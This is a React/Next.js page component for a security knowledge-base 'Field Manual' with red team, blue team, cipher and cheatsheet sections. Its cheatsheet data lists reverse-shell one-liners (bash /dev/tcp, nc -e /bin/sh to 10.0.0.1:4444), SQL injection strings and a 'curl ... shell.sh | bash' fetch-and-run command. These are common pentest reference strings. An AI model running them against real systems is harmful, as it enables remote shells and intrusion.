"use client";

import Link from "next/link";
import {
    BookOpen, Shield, Code, Terminal, Network, Search, Hash,
    Lock, Database, Globe, FileText, Cpu, Eye, Plus, Check, X,
    Users, Activity, Key
} from "lucide-react";
import { useState } from "react";
import clsx from "clsx";
import { toast } from "sonner";
import { motion, AnimatePresence } from "framer-motion";

export default function DocsPage() {
    const [activeSection, setActiveSection] = useState("red-team");
    const [savedItems, setSavedItems] = useState<string[]>([]);
    const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

    const addToNotes = (title: string, content: string | string[]) => {
        const userId = localStorage.getItem("cypher_auth");
        if (!userId) {
            toast.error("ACCESS DENIED", { description: "Authentication required to save notes." });
            return;
        }

        const storageKey = `cypher_notes_${userId}`;
        const existingNotes = JSON.parse(localStorage.getItem(storageKey) || "[]");

        const noteContent = Array.isArray(content) ? content.join("\n") : content;

        const newNote = {
            id: Date.now().toString(),
            title: `Ref: ${title}`,
            content: noteContent,
            date: new Date().toLocaleDateString()
        };

        localStorage.setItem(storageKey, JSON.stringify([newNote, ...existingNotes]));

        setSavedItems(prev => [...prev, title]);
        toast.success("INTELLIGENCE SAVED", { description: "Data transfer to encrypted storage complete." });

        setTimeout(() => {
            setSavedItems(prev => prev.filter(i => i !== title));
        }, 2000);
    };

    const sections: Record<string, any> = {
        "red-team": {
            title: "Red Team / Offensive",
            icon: Shield,
            color: "text-red-500",
            content: [
                {
                    title: "Web Exploitation Methodology",
                    icon: Globe,
                    desc: "Standard procedure for assessing web application security.",
                    items: [
                        "Reconnaissance (Subdomain enumeration, Tech stack analysis)",
                        "Mapping (Spidering, Parameter analysis)",
                        "Discovery (Vulnerability scanning, Manual testing)",
                        "Exploitation (SQLi, XSS, RCE)",
                    ]
                },
                {
                    title: "Network Penetration Testing",
                    icon: Network,
                    desc: "Guide to compromising network infrastructure.",
                    items: [
                        "External/Internal Recon (Nmap, Masscan)",
                        "Enumeration (SMB, SNMP, LDAP)",
                        "Exploitation (Metasploit, public exploits)",
                        "Post-Exploitation (Privilege Escalation, Persistence)",
                    ]
                },
                {
                    title: "Active Directory Attacks",
                    icon: Users,
                    desc: "Common vectors for compromising Windows domains.",
                    items: [
                        "LLMNR Analysis (Responder)",
                        "Kerberoasting (GetUserSPNs)",
                        "AS-REP Roasting",
                        "DCSync (SecretsDump)",
                    ]
                }
            ]
        },
        "blue-team": {
            title: "Blue Team / Defensive",
            icon: Lock,
            color: "text-blue-500",
            content: [
                {
                    title: "Incident Response Lifecycle",
                    icon: Activity,
                    desc: "NIST SP 800-61 r2 Standard Framework.",
                    items: [
                        "Preparation (People, Processes, Technology)",
                        "Detection & Analysis (Monitoring, Triage)",
                        "Containment, Eradication, & Recovery",
                        "Post-Incident Activity (Lessons Learned)",
                    ]
                },
                {
                    title: "Linux Hardening Checklist",
                    icon: Terminal,
                    desc: "Essential steps to secure a Linux server.",
                    items: [
                        "User Management (Disable root login, SSH keys)",
                        "Network (Firewall setup, Fail2Ban)",
                        "Services (Remove unnecessary services)",
                        "Updates (Unattended upgrades)",
                    ]
                },
                {
                    title: "Windows Event Logs",
                    icon: FileText,
                    desc: "Critical ID's to monitor for intrusion detection.",
                    items: [
                        "4624: Successful Logon / 4625: Failed Logon",
                        "4720: User Account Created",
                        "4688: Process Creation (Command Line Auditing)",
                        "1102: Audit Log Cleared",
                    ]
                }
            ]
        },
        "cryptography": {
            title: "Codes & Ciphers",
            icon: Key,
            color: "text-purple-500",
            content: [
                {
                    title: "Common Hash Formats",
                    icon: Hash,
                    desc: "Identifying hash types by length and format.",
                    items: [
                        "MD5: 32 chars (0-9, a-f)",
                        "SHA-1: 40 chars",
                        "SHA-256: 64 chars",
                        "NTLM: 32 chars (Windows)",
                    ]
                },
                {
                    title: "Classic Ciphers",
                    icon: Lock,
                    desc: "Historical encryption methods often used in CTFs.",
                    items: [
                        "Caesar Cipher (Rotation)",
                        "Vigenère Cipher (Polyalphabetic)",
                        "Atbash (Substitution)",
                        "Morse Code",
                    ]
                }
            ]
        },
        "cheatsheets": {
            title: "Field Cheatsheets",
            icon: FileText,
            color: "text-yellow-500",
            content: [
                {
                    title: "Reverse Shells",
                    icon: Code,
                    desc: "Common one-liners for establishing connectivity.",
                    code: true,
                    items: [
                        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                        "python -c 'import socket,subprocess,os;s=socket.socket...'",
                        "nc -e /bin/sh 10.0.0.1 4444",
                    ]
                },
                {
                    title: "Nmap Scans",
                    icon: Eye,
                    desc: "Essential Nmap command variants.",
                    code: true,
                    items: [
                        "nmap -sC -sV -oA output <target>",
                        "nmap -p- --min-rate=1000 <target>",
                        "nmap -sU --top-ports 20 <target>",
                    ]
                },
                {
                    title: "SQL Injection Payloads",
                    icon: Database,
                    desc: "Standard testing strings for SQLi.",
                    code: true,
                    items: [
                        "' OR 1=1 --",
                        "' UNION SELECT null, version() --",
                        "admin' --",
                    ]
                },
                {
                    title: "File Transfer (Linux)",
                    icon: Network,
                    desc: "Moving files without SCP/FTP.",
                    code: true,
                    items: [
                        "python3 -m http.server 80",
                        "wget http://10.10.14.2/linpeas.sh",
                        "curl http://10.10.14.2/shell.sh | bash",
                    ]
                }
            ]
        }
    };

    return (
        <div className="min-h-screen p-4 md:p-6 font-mono relative">
            <div className="max-w-7xl mx-auto">
                <header className="mb-12 border-b border-border pb-6 flex flex-col md:flex-row md:items-end justify-between gap-4">
                    <div className="flex-1">
                        <div className="flex items-center gap-2 text-primary mb-2">
                            <BookOpen size={20} />
                            <span className="text-sm">CYPERDOCS // KNOWLEDGE_BASE</span>
                        </div>
                        <h1 className="text-3xl md:text-4xl font-bold tracking-tight mb-4">Field Manual</h1>
                        <p className="text-text-muted max-w-2xl text-sm md:text-base">
                            A curated collection of methodologies, checklists, and references for operatives in the field.
                        </p>
                    </div>
                    <button
                        onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                        className="lg:hidden flex items-center justify-center gap-2 px-4 py-2 bg-primary/10 text-primary border border-primary/20 rounded font-bold transition-all active:scale-95"
                    >
                        <Search size={18} />
                        <span>CHAPTERS</span>
                    </button>
                </header>

                <div className="grid grid-cols-1 lg:grid-cols-4 gap-8">
                    {/* Mobile Menu Backdrop */}
                    <AnimatePresence>
                        {isMobileMenuOpen && (
                            <motion.div
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                                onClick={() => setIsMobileMenuOpen(false)}
                                className="lg:hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-[45]"
                            />
                        )}
                    </AnimatePresence>

                    {/* Sidebar Navigation */}
                    <aside className={clsx(
                        "fixed inset-y-0 left-0 w-72 bg-surface lg:bg-transparent border-r border-border lg:border-none p-6 lg:p-0 z-50 transform transition-transform duration-300 lg:relative lg:translate-x-0 lg:col-span-1 lg:z-auto",
                        isMobileMenuOpen ? "translate-x-0" : "-translate-x-full"
                    )}>
                        <div className="flex items-center justify-between mb-8 lg:hidden text-primary">
                            <span className="font-bold">CHAPTER_INDEX</span>
                            <button onClick={() => setIsMobileMenuOpen(false)}><X size={20} /></button>
                        </div>

                        <div className="space-y-2">
                            {Object.entries(sections).map(([key, section]) => (
                                <button
                                    key={key}
                                    onClick={() => { setActiveSection(key); setIsMobileMenuOpen(false); }}
                                    className={clsx(
                                        "w-full text-left px-4 py-3 rounded-md flex items-center gap-3 transition-colors",
                                        activeSection === key
                                            ? "bg-primary/10 text-primary border border-primary/20"
                                            : "hover:bg-surface text-text-muted hover:text-text"
                                    )}
                                >
                                    <section.icon size={18} className={activeSection === key ? section.color : ""} />
                                    <span className="font-bold">{section.title}</span>
                                </button>
                            ))}
                        </div>
                    </aside>

                    {/* Main Content Area */}
                    <div className="lg:col-span-3">
                        <h2 className={clsx("text-2xl font-bold mb-6 flex items-center gap-3", sections[activeSection].color)}>
                            {sections[activeSection].title}
                        </h2>

                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {sections[activeSection].content.map((item: any, i: number) => (
                                <div key={i} className="bg-surface border border-border rounded-lg p-6 group hover:border-primary/50 transition-colors relative">
                                    <button
                                        onClick={() => addToNotes(item.title, item.items)}
                                        className="absolute top-4 right-4 text-text-muted hover:text-primary transition-colors p-1"
                                        title="Add to Notes"
                                    >
                                        {savedItems.includes(item.title) ? <Check size={18} className="text-primary" /> : <Plus size={18} />}
                                    </button>

                                    <div className="flex items-center gap-3 mb-4">
                                        <div className="p-2 bg-background rounded-md text-primary">
                                            <item.icon size={20} />
                                        </div>
                                        <div>
                                            <h3 className="font-bold text-lg group-hover:text-primary transition-colors pr-6 text-text">{item.title}</h3>
                                        </div>
                                    </div>
                                    <p className="text-text-muted text-sm mb-4 min-h-[40px]">{item.desc}</p>

                                    <div className="space-y-2">
                                        {item.items.map((subItem: string, j: number) => (
                                            <div key={j} className={clsx(
                                                "text-sm p-2 rounded border",
                                                item.code
                                                    ? "bg-secondary/10 border-border font-mono text-primary"
                                                    : "bg-background/50 border-transparent text-text-muted"
                                            )}>
                                                {subItem}
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
